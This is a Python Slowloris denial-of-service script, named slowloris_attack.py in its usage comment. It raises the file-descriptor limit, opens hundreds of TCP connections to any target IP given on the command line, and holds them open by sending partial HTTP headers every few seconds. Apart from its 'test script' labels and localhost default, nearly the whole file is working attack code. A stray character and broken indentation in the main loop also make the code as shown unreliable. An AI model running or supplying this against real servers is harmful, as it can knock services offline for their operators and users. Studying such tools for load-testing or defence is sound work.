import socket
import time
import random
import sys
import resource


def raise_fd_limit(target_count):
    """Raises the soft file-descriptor limit so socket_count sockets can
    actually be opened. Linux defaults to 1024, which silently caps
    large socket counts (e.g. 1500) well below the requested amount."""
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    needed = target_count + 100  # small buffer for stdio/other fds
    if soft < needed:
        new_soft = min(needed, hard)
        try:
            resource.setrlimit(resource.RLIMIT_NOFILE, (new_soft, hard))
            print(f"[+] Raised file descriptor limit: {soft} -> {new_soft} (hard cap: {hard})")
            if new_soft < needed:
                print(f"[!] WARNING: hard limit ({hard}) is below what {target_count} "
                      f"sockets need ({needed}). Run 'ulimit -Hn' to check, or raise it "
                      f"via /etc/security/limits.conf for a permanent fix.")
        except (ValueError, PermissionError) as e:
            print(f"[!] WARNING: could not raise file descriptor limit ({e}). "
                  f"You may hit 'Too many open files' well before {target_count} sockets.")


def create_slowloris_socket(target_ip, target_port):
    """Initializes a TCP connection and transmits incomplete HTTP headers."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_ip, target_port))

        s.send(f"GET /?{random.randint(0, 5000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        return s
    except socket.error:
        return None


def run_slowloris_simulation(target_ip, target_port=80, socket_count=100, interval=14):
    """Main loop: Maintains stalled connection states by sending periodic header fragments."""
    raise_fd_limit(socket_count)

    print(f"[+] Initializing Slowloris test script against target {target_ip}:{target_port}")
    print(f"[+] Establishing {socket_count} persistent connection sockets...")

    sockets = []

    for i in range(socket_count):
        s = create_slowloris_socket(target_ip, target_port)
        if s:
            sockets.append(s)
        if (i + 1) % 20 == 0:
            print(f"[*] Connected {len(sockets)} / {socket_count} sockets...")

    print(f"[+] Connected {len(sockets)} stalled sockets.")
    print(f"[+] Injecting periodic header fragments every {interval}s to hold thread state...\n")

    try:
        while True:
            active_sockets = 0
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                    active_sockets += 1
                except socket.error:
          f          sockets.remove(s)

            print(f"[*] Connection state maintained: {active_sockets} active sockets.")

            while len(sockets) < socket_count:
                s = create_slowloris_socket(target_ip, target_port)
                if s:
                    sockets.append(s)
                else:
                    break

            time.sleep(interval)

    except KeyboardInterrupt:
        print("\n[-] Test script terminated. Closing remaining sockets...")
        for s in sockets:
            s.close()


if __name__ == "__main__":
    # Usage: python slowloris_attack.py <TARGET_IP> <PORT> <SOCKET_COUNT> <INTERVAL_SECONDS>
    target_host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    num_sockets = int(sys.argv[3]) if len(sys.argv) > 3 else 100
    header_interval = int(sys.argv[4]) if len(sys.argv) > 4 else 14

    run_slowloris_simulation(target_host, target_port, num_sockets, header_interval)